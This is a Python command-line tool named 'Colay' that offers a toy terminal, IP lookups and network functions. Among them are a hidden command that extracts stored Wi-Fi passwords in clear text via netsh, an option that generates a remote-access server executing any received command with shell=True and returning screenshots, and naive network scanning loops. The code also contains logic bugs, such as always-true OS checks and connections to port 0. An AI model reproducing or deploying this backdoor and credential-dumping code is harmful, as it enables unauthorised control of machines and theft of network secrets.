import argparse
from cProfile import label
from genericpath import isfile
import socket
import random
import sys, os, threading, time
import os, sys, threading, time, shutil, subprocess, re, datetime, platform, socket
from colorama import Fore, Style, Back
import base64
import sys, requests
import json, platform,psutil
admin_login_tkinter = False
try:
   from tkinter import *
   admin_login_tkinter = True
except:
   admin_login_tkinter = False


   
terminal_offon = False
def install_home():
  print(f"[*] {colors.green}Installing{colors.white} ...")
  def one():
    if osname=="windows":
      os.system("md C:\\colay")
      os.system("cls")
    elif osname=="kali" or "linux":
      os.system("mkdir ~/colay")
      os.system("clear")
  def two():
    if osname=="windows":
      os.system("md C:\\colay\\usr")
      os.system("md C:\\colay\\home")
      os.system("cls")

    elif osname=="kali" or "linux":
      os.system("mkdir ~/colay/usr")
      os.system("mkdir ~/colay/home")
      os.system("clear")
  
      
  def three():
    if osname=="windows":
      os.system("md C:\\colay\\usr\\tmp")
      os.system("cls")
    elif osname=="kali" or "linux":
      os.system("mkdir ~/colay/usr/tmp")
      os.system("clear")
    
  def four():
    if osname=="windows":
      os.system("md C:\\colay\\usr\\bin")
      os.system("cls")
    elif osname=="kali" or "linux":
      os.system("mkdir ~/colay/usr/etc")
      os.system("clear")

  def five():
    if osname=="windows":
      os.system("md C:\\colay\\usr\\etc")
      os.system("cls")
    elif osname=="kali" or "linux":
      os.system("mkdir ~/colay/usr/bin")
      os.system("clear")

  def six():
    if osname=="windows":
      os.system("md C:\\colay\\usr\\var")
      os.system("cls")
    elif osname=="kali" or "linux":
      os.system("mkdir ~/colay/usr/var")
      os.system("clear")

  def seven():
     if osname=="windows":
       open("C:\\colay\\usr\\etc\\startuplog","a").close()
       with open("C:\\colay\\usr\\etc\\terminal.log","+w") as f:
          obsah2="""
{
  {
  terminal=off
  }
}
"""
          f.write(obsah2)


     elif osname=="kali" or "linux":
       u="~/colay/usr/etc/termilog.log"
       u2 =f"touch {u}"
       os.system(u2)
       u3 = "~/colay/usr/etc/startuplog"
       u4 =f"touch {u3}"
       os.system(u4)
     
          
     
  def eight():
    pass
  try:
     one()
     two()
     three()
     four()
     five()
     six()
     seven()
     eight()
     print(f"[*]{colors.green} Installed{colors.white}")
     sys.exit()
  except:
     try:
      two()
     except:
        try:
          three()
        except:
           try:
              four()
           except:
              try:
                 five()
              except:
                 try:
                    six()
                 except:
                    try:
                       seven()
                       eight()
                       print(f"[*]{colors.green} Installed{colors.white}")
                       sys.exit()
                       
                    except:
                       print(f"[*]{colors.green} Installed{colors.white}")
                       sys.exit()
                       

   
def control():
   pass
parser = argparse.ArgumentParser()
parser.add_argument('--connect', action='store_true', help='')
parser.add_argument('-t', action='store_true', help='')
parser.add_argument('--install', action='store_true', help='')
parser.add_argument('-on', action='store_true', help='')
parser.add_argument('-off', action='store_true', help='')
parser.add_argument('--admin', action='store_true', help='')
parser.add_argument('-e', action='store_true', help='')
parser.add_argument('-s', action='store_true', help='')
parser.add_argument('--get', action='store_true', help='')
parser.add_argument('--ip', action='store_true', help='')
parser.add_argument('-l', action='store_true', help='')
parser.add_argument('-i', action='store_true', help='')
parser.add_argument('--create', action='store_true', help='')
parser.add_argument('--remt', action='store_true', help='')
parser.add_argument('-g', action='store_true', help='')
parser.add_argument('--port', action='store_true', help='')
parser.add_argument('--public-ip', action='store_true', help='')
parser.add_argument('--private-ip', action='store_true', help='')
parser.add_argument('--terminal', action='store_true', help='')
parser.add_argument('-c', type=str, help='')
parser.add_argument('--get-port', type=str, help='')
parser.add_argument('--get-ip', type=str, help='')
parser.add_argument('-n', type=str, help='')
parser.add_argument('-w', type=str, help='')
args = parser.parse_args()





class colors:
    blue = '\033[94m'
    cyan = '\033[96m'
    green = '\033[92m'
    red = '\033[31m'
    pink = '\033[35m'
    white = '\033[37m'
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1 / 200)

if platform.system() == "Linux":
   osname="linux"
elif platform.system() == "Windows":
   osname="windows"
elif platform.system() == "Kali":
   osname="kali"
else:
   user_os = os.name
   slowprint(colors.red + "You cant run " + colors.white + user_os + colors.red + "Colay")
   sys.exit()

if osname=="windows":
  if os.path.isfile("C:/colay/usr/etc/terminal.log"):
    with open("C:/colay/usr/etc/terminal.log","+r") as f:
        cont = f.read()
        
        co = cont.replace("{","").replace("}","").replace(" ","").replace("terminal=","")
        if "on" in co:
           terminal_offon = True
           
           
        if "off" in co:
           terminal_offon = False

        
  else:
    terminal_offon = False
   
elif osname=="kali" or "linux":
   
   slozka = "~/colay/usr/etc"
   soubor = "termilog.log"
   cesta_k_souboru = os.path.join(os.path.expanduser(slozka), soubor)
   if os.path.exists(cesta_k_souboru):
      terminal_offon = True
   else:
      terminal_offon = False
      

elif osname=="kali" or "linux":
   slozka = "~/colay/usr/etc"
   soubor = "termilog.log"
   cesta_k_souboru = os.path.join(os.path.expanduser(slozka), soubor)
   if os.path.exists(cesta_k_souboru):
      terminal_offon = True
   else:
      terminal_offon = False

def terminal():
  if terminal_offon==True:
     pass
  if terminal_offon==False:
     print(f"[-]{colors.red} Terminal is Off{colors.white}[6x66]{colors.white}")
     sys.exit()
  pozice = "~"
  
  try:
       with open("C:/colay/usr/etc/startuplog","+r") as f:
          try:
            command = f.read()
            os.system(command)
          except:
             print(f"[-]{colors.red} Uknow Command {command}{colors.white}")
             
  except:
    if osname=="windows":
       print(f"[-]{colors.red} Missing Files{colors.white}")
       sys.exit()
    else:
      pass
  if osname=="windows":
       os.system("title Colay")
       try:
          os.chdir("C:\\colay\\home")
       except:
          print(f"[-]{colors.red} Missing Files{colors.white}")
          sys.exit()

  elif osname=="kali" or "linux":
      
      try:
        cesta = "../colay/home"
        os.chdir(cesta)
      except:
        try:
          cesta = "../../colay/home"
          os.chdir(cesta)
        except:
          try:
            cesta = "../../../colay/home"
            os.chdir(cesta)
          except:
            try:
              cesta = "../../../../colay/home"
              os.chdir(cesta)
            except:
              print(f"[-]{colors.red} Missing Files{colors.white}")
              sys.exit()
          
        
  
  while True:
    

    lister = (colors.red + colors.white + "colay" + colors.red + "@" +colors.white+"" "localhost:" + colors.red + colors.pink + pozice + colors.red + "# " + colors.white)
    c = input(lister)
    words = c.split()
    novapozice = "/".join(pozice.rsplit("/", 1)[:-1])
    if c.startswith("cd "):
        c1 = c[3:]
        if c1=="..":
            if pozice=="~":
                pass
            else:
                pozice = novapozice
                os.chdir("..")
        else:
          try:
            os.chdir(c1)
            pozice = pozice + "/"+c1
          except:
            print(f"[-]{colors.red}{c1} Not Found{colors.white}")
    elif c=="colay":
        banner = f"""
  ____     {colors.red} _ 
 / __|  __ {colors.red}| | __ _ {colors.white}_   _
| |   / _ \{colors.red}| |/ _` |{colors.white} | | |
| |__| (_) {colors.red}| | (_| |{colors.white} |_| |
 \____\___/{colors.red}|_|\__,_|{colors.white}\__, |
                    {colors.white} |___/"""
        slowprint(banner)
        os_name = platform.system()
        os_release = platform.release()
        os_version = platform.version()
        os_architecture = platform.architecture()

        user_name = os.getlogin()

        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)


        info =f"""
OS: {os_name}
Release: {os_release}
Version: 0.2
Architecture: {os_architecture}
Name: {user_name}
Host Name: {host_name}
IP: {ip_address}
"""
        slowprint(info)


    elif c=="info":
        banner = f"""
  ____     {colors.red} _ 
 / __|  __ {colors.red}| | __ _ {colors.white}_   _
| |   / _ \{colors.red}| |/ _` |{colors.white} | | |
| |__| (_) {colors.red}| | (_| |{colors.white} |_| |
 \____\___/{colors.red}|_|\__,_|{colors.white}\__, |
                    {colors.white} |___/"""
        slowprint(banner)
        os_name = platform.system()
        os_release = platform.release()
        os_version = platform.version()
        os_architecture = platform.architecture()

        user_name = os.getlogin()

        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)


        info =f"""
OS: {os_name}
Release: {os_release}
Version: 0.2
Architecture: {os_architecture}
Name: {user_name}
Host Name: {host_name}
IP: {ip_address}
"""
        slowprint(info)
    elif c=="exit":
        print(colors.pink + "Goodbye - Colay" + colors.white)
        sys.exit()

    elif c=="whoami":
        os.system("whoami")


    elif c.startswith("mkdir "):
        c2 = c[6:]
        if osname=="windows":
          try:
           c3 = f"md {c2}"
           os.system(c3)
          except:
            print(f"[-]{colors.red} Uknow Error {colors.white}[2x03]")
        elif osname=="kali" or "linux":
          try:
           c3=f"mkdir {c2}"
           os.system(c3)
          except:
            print(f"[-]{colors.red} Uknow Error {colors.white}[2x02]")
        

        
    elif len(words) == 4 and words[0] == "cp" and words[2] == "-r":
        source_folder = words[1]
        destination_folder = words[3]

    
        try:
            shutil.move(source_folder, destination_folder)
            print(f"[*] Folder {source_folder} has been successfully moved to {destination_folder}.")
        except Exception as e:
            print(f"{colors.red}[*] An error occurred while moving the folder: {e}{colors.white}")
    elif c=="ls":
        passs = os.listdir()
        print(passs)


    
    elif c=="@log.startup":
       if osname=="windows":
          try:
            os.system("start C:\\colay\\usr\\etc\\startuplog")




          except:
             print(f"[-]{colors.red} Missing Files{colors.white}")
       elif osname=="kali" or "linux":
          pass
    







    elif c=="clear":
        if osname=="windows":
           os.system("cls")
        elif osname=="kali" or "linux":
           os.system("clear")
        elif osname=="windows":
           os.system("cls")
        else:
           print("Unknow error")
    elif c=="ipconfig":
        if osname=="kali" or "linux" or "windows":
          try:
           s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
           s.connect(("8.8.8.8", 80))
           public_ip = requests.get('https://api.ipify.org').text
           print(f"\n{public_ip}\n\n{s.getsockname()[0]}\n")
           s.close()
          except:
            print(f"[-]{colors.red} Uknow Error {colors.white}[0x01]")
        
    elif c=="list":
        def get_running_processes():
         try:
          running_processes = []
          for process in psutil.process_iter(attrs=['pid', 'name']):
            running_processes.append((process.info['pid'], process.info['name']))
          return running_processes
         except:
           print(f"[-]{colors.red} Uknow Error {colors.white}[3x02]")
        if __name__ == "__main__":
          processes = get_running_processes()
          for pid, name in processes:
            print(f"NAME : {name} PID : {pid}")
    elif c.startswith("kill "):
        c2 = c[5:]
        if osname=="windows":
         try:
          c3 = f"taskkill /f /im {c2}"
          os.system(c3)
         except:
           print(f"[-]{colors.red} Uknow Error {colors.white}[3x03]")
        elif osname=="kali" or "linux":
           def kill_process_by_name(process_name):
            try:
              subprocess.run(["pkill", process_name])
            except subprocess.CalledProcessError:
              print(f"[-]{colors.red} No processes {colors.white}\"{process_name}\" ")

        if __name__ == "__main__":
          process_name = c2
          kill_process_by_name(process_name)

        elif osname=="windows":
         try:
          c3 = f"taskkill /f /im {c2}"
          os.system(c3)
         except:
           print(f"[-]{colors.red} Uknow Error {colors.white}[3x03]")

    elif c.startswith("less "):
        file_to_display = c[5:]
        def display_file_content(filename):
            try:
                with open(filename, 'r') as file:
                    content = file.read()
                    print(content)
            except FileNotFoundError:
                print(f"[-]{colors.red} File {colors.white}'{filename}' {colors.red}not found.{colors.white}")
        display_file_content(file_to_display)
    
    elif c=="show --wifi --all -u -p":
      if osname=="windows":
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
        wifi_list = []
        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profile = {}
                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile)

    

        for x in range(len(wifi_list)):
            print(wifi_list[x])
      else:
        print("Comming soon")
    
    elif c.startswith("rm "):
        c2 = c[3:]
        if osname=="windows":
         try:
          c3 = f"del {c2}"
          os.system(c3)
         except:
           print(f"[-]{colors.red} Uknow Error {colors.white}[4x00]")
        elif osname=="linux" or "kali":
          c3 = f"rm -rf {c2}"
        elif osname=="windows":
         try:
          c3 = f"del {c2}"
          os.system(c3)
         except:
           print(f"[-]{colors.red} Uknow Error {colors.white}[4x02]")
    elif c=="uname":
        system_info = platform.uname()
        print("System Information:\n")
        print(f"System: {system_info.system}")
        print(f"Node Name: {system_info.node}")
        print(f"Release: {system_info.release}")
        print(f"Version: {system_info.version}")
        print(f"Machine: {system_info.machine}")
        print(f"Processor: {system_info.processor}")
        print(f"OS: Colay")
    
    elif c.startswith("touch "):
        c1 = c[6:]
        try:
          open(c1, 'a').close()
        except:
          print(f"[-]{colors.red} Uknow Error {colors.white}[5x01]")

    
    elif c=="help":
       banner2 = f"""
  ____     {colors.red} _ 
 / __|  __ {colors.red}| | __ _ {colors.white}_   _
| |   / _ \{colors.red}| |/ _` |{colors.white} | | |
| |__| (_) {colors.red}| | (_| |{colors.white} |_| |
 \____\___/{colors.red}|_|\__,_|{colors.white}\__, |
        version 0.2{colors.white} |___/"""
       help_text = """
mkdir             Makes a File
less              Opens The File and Reads it
uname             Write Information About The PC
touch             Creates a File
rm                Deletes the File
kill              Kills a Running Program
list              Shows a Running Programs
ipconfig          Shows Your IP Address
clear             Clears the Screen
ls                Shows your Files
cp                Copies the Files
exit              Closes the Colay
whoami            Displays Your Name
cd                Changes the Current Directory
"""
       slowprint(banner2)
       print(help_text)
    
    
    else:
       print(f"{colors.white}\"{c}\"{colors.red} is not command{colors.white}")

    
    
    
    

      















if args.connect:
  if args.get:
     
     if args.public_ip:
        if args.i:
          response = requests.get('https://api64.ipify.org?format=json').json()
          response_str = str(response)
          cleaned_response_str = response_str.replace("{", "").replace("}", "").replace(":", "").replace("\'", "").replace("ip","").replace(" ","")
          the_ip = cleaned_response_str
          file_type = 'json'
        



          def locate_data():
            lookup = 'https://ipapi.co'
            response = requests.get(f'{lookup}/{the_ip}/json/').json()
            location_data={
                "ip": the_ip,
                "org": response.get("org"),
                "hostname": response.get("hostname"),
                "version": response.get("version"),
                "city": response.get("city"),
                "country": response.get("country"),
                "country_code": response.get("country_code"),
                "country_name": response.get("country_name"),
                "country_code_iso3": response.get("country_code_iso3"),
                "country_capital": response.get("country_capital"),
                "country_tld": response.get("country_tld"),
                "country_area": response.get("country_area"),
                "country_population": response.get("country_population"),
                "region": response.get("region"),
                "region_code": response.get("region_code"),
                "continent_code": response.get("continent_code"),
                "in_europe": response.get("in_eu"),
                "postal": response.get("postal"),
                "latitude": response.get("latitude"),
                "longitude": response.get("longitude"),
                "timezone": response.get("timezone"),
                "utc_offset": response.get("utc_offset"),
                "country_calling_code": response.get("country_calling_code"),
                "currency": response.get("currency"),
                "currency_name": response.get("currency_name"),
                "languages": response.get("languages"),
            }
            return location_data
          formatted_location_data = json.dumps(locate_data(), indent=4)
          finnal_text = formatted_location_data.replace("\"","").replace("{","").replace("}","")
          print(finnal_text)
        









        else:
            def my_ip():
                response = requests.get('https://api64.ipify.org?format=json').json()
                response_str = str(response)
                cleaned_response_str = response_str.replace("{", "").replace("}", "").replace(":", "").replace("\'", "").replace("ip","")
                return cleaned_response_str
            print(my_ip())
            sys.exit()
     elif args.get_ip and args.i:
          file_type = 'json'
          the_ip = args.get_ip

          def locate_data():
            lookup = 'https://ipapi.co'
            response = requests.get(f'{lookup}/{the_ip}/json/').json()
            location_data={
                "ip": the_ip,
                "org": response.get("org"),
                "hostname": response.get("hostname"),
                "version": response.get("version"),
                "city": response.get("city"),
                "country": response.get("country"),
                "country_code": response.get("country_code"),
                "country_name": response.get("country_name"),
                "country_code_iso3": response.get("country_code_iso3"),
                "country_capital": response.get("country_capital"),
                "country_tld": response.get("country_tld"),
                "country_area": response.get("country_area"),
                "country_population": response.get("country_population"),
                "region": response.get("region"),
                "region_code": response.get("region_code"),
                "continent_code": response.get("continent_code"),
                "in_europe": response.get("in_eu"),
                "postal": response.get("postal"),
                "latitude": response.get("latitude"),
                "longitude": response.get("longitude"),
                "timezone": response.get("timezone"),
                "utc_offset": response.get("utc_offset"),
                "country_calling_code": response.get("country_calling_code"),
                "currency": response.get("currency"),
                "currency_name": response.get("currency_name"),
                "languages": response.get("languages"),
            }
            return location_data
          formatted_location_data = json.dumps(locate_data(), indent=4)
          finnal_text = formatted_location_data.replace("\"","").replace("{","").replace("}","")
          print(finnal_text)

     elif args.private_ip:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(s.getsockname()[0])
        s.close()
    













  elif args.c:
    address_parts = args.c.split(":")
    if len(address_parts) == 2:
      ip_address, port = address_parts
      def receive_messages(client_socket):
        while True:
          try:
            message = client_socket.recv(1024).decode()
            if not message:
                break
            print(message)
          except ConnectionResetError:
            break


      def send_messages(client_socket):
        while True:
          message = input(f"colay@{ip_address}:{port}> ")
          client_socket.send(message.encode())

      try: 
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((ip_address, int(port)))
        print(f"Connected to Server {ip_address}:{port}")
      except:
         print(f"{ip_address}:{int(port)} is not running")
      receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
      receive_thread.start()

      send_messages(client_socket)
    

    
      
  elif args.w:
    try:
      server_ip, server_port = args.w.split(":")
    except:
      print(args.w + "\n Port?")
      sys.exit()
    server_port=8080     
    retry_time = 1

    def connect_to_server():
      while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            print(f"Connected to server {server_ip}:{server_port}")
            return client_socket
        except Exception as e:
            print(f"Connection failed")
            time.sleep(retry_time)

    def main():
      while True:
        client_socket = connect_to_server()
        
        try:
          
            while True:
              message=input(f"colay@{server_ip}:{server_port}> ")
              client_socket.send(message.encode())

            
        except Exception as e:
            print(f"Error: {e}")
            print("Reconnecting...")
            client_socket.close()

    if __name__ == "__main__":
      main()

    
    








  
  
      

  elif args.g:
    if args.s:
        if args.e and args.private_ip:
          base_ip = "192.168.0."
          for x in range(256):
            ip_adresa = base_ip + str(x)
            server_port=0
            try:
              client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              client_socket.connect((ip_adresa, server_port))
              print("Connected.")
            except:
              print(ip_adresa,"Not Connected")
        if args.e and args.public_ip:
          for a in range(256):
            for b in range(256):
              for c in range(256):
                for d in range(255):
                  ip_adresa=f"{a}.{b}.{c}.{d}"
                  server_port=0
                  try:
                    print("Connecting to: ", ip_adresa)
                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client_socket.connect((ip_adresa, server_port))
                    print("Connected.")
                  except:
                    print("Not Connected: ", ip_adresa)
                      
            
            
            
  elif args.public_ip:
    if args.t:
      if args.port:
        cislo1 = random.randint(0, 256)
        cislo2 = random.randint(0, 256)
        cislo3 = random.randint(0, 256)
        cislo4 = random.randint(0, 256)
        cislo5 = random.randint(0,65535)
        print(f"{cislo1}.{cislo2}.{cislo3}.{cislo4}:{cislo5}")
    else:
      cislo1 = random.randint(0, 256)
      cislo2 = random.randint(0, 256)
      cislo3 = random.randint(0, 256)
      cislo4 = random.randint(0, 256)
      print(f"{cislo1}.{cislo2}.{cislo3}.{cislo4}")
  elif args.private_ip:
    if args.t:
      if args.port:
        cislo5 = random.randint(0,65535)
        cislo1 = random.randint(0, 256)
        print(f"192.168.0.{cislo1}:{cislo5}")
        
    else:
      cislo1 = random.randint(0, 256)
      print(f"192.168.0.{cislo1}")
  
  

        
           
           
elif args.create:
  if args.remt:
    if args.n:
        if args.get_ip:
          if args.get_port:
          
            server_input=f"""
import socket
import threading
import os
from PIL import ImageGrab
import base64, subprocess
from gtts import gTTS
import requests, sys
from tkinter import messagebox
ip="{args.get_ip}"
port = {args.get_port}


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.bind((ip, port))
server_socket.listen()


clients = []

def handle_client(client_socket):
    while True:
        try:
            message = client_socket.recv(1024).decode()
            if not message:
                break
            
            
            
            if message.lower() == "ls":
                current_directory = os.getcwd()
                directory_contents = "\\n".join(os.listdir(current_directory))
                client_socket.send(directory_contents.encode())

            elif message.lower() == "tasklist":
                task_list = os.popen("tasklist").read()
                client_socket.send(task_list.encode())
            elif message.lower() == "screenshot":
                screenshot = ImageGrab.grab()
                screenshot.save("screenshot.png")
                
                with open("screenshot.png", "rb") as f:
                    screenshot_data = f.read()
                    screenshot_base64 = base64.b64encode(screenshot_data).decode()
                    client_socket.send(screenshot_base64.encode())

            try:
                result = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT, text=True)
                client_socket.send(result.encode())
            except:
                pass


        except:
            pass

    clients.remove(client_socket)
    client_socket.close()





def broadcast(message):
    for client in clients:
        try:
            client.send(message.encode())
        except:
            clients.remove(client)

while True:
    client_socket, client_address = server_socket.accept()
    clients.append(client_socket)

    client_thread = threading.Thread(target=handle_client, args=(client_socket,))
    client_thread.start()
"""
            try:
              with open(args.n,"+w") as f:
                f.write(server_input)
            except:
              pass
            if os.path.isfile(args.n):
              print(args.n + " Created.")
            else:
              print(args.n + " Uknow Error")
elif args.terminal:
  if args.s and args.on:
     if osname=="windows":
      try:
        os.system("del C:\\colay\\usr\\etc\\terminal.log")
        with open("C:\\colay\\usr\\etc\\terminal.log","+w") as f:
          
          obsah2="""
{
  {
  terminal=on
  }
}
"""
          f.write(obsah2)
          print(f"[*] Terminal {colors.green}on{colors.white}")
          sys.exit()

      except:
          if os.path.exists("C:\\colay\\usr\\etc\\terminal.log"):
            pass
          else:
            print(f"[-] {colors.red}Missing Files{colors.white}")
            sys.exit()
          
      
     elif osname=="kali" or "linux":
        try:
          os.system("touch ~/colay/usr/etc/termilog.log")
          sys.exit()
        except:
           sys.exit()
  elif args.s and args.off:
     if osname=="windows":
      try:
        os.system("del C:\\colay\\usr\\etc\\terminal.log")
        with open("C:\\colay\\usr\\etc\\terminal.log","+w") as f:
          obsah2="""
{
  {
  terminal=off
  }
}
"""
          f.write(obsah2)
          print(f"[*] Terminal {colors.green}off{colors.white}")
          sys.exit()
        
        
        
        
      except:
          if os.path.exists("C:\\colay\\usr\\etc\\terminal.log"):
            pass
          else:
            print(f"[-] {colors.red}Missing Files{colors.white}")
            sys.exit()
      
     elif osname=="kali" or "linux":
        try:
           sys.exit()
        except:
           sys.exit()
          
     

  else:
    threading.Thread(target=terminal).start()
elif args.install:
   threading.Thread(target=install_home).start()          
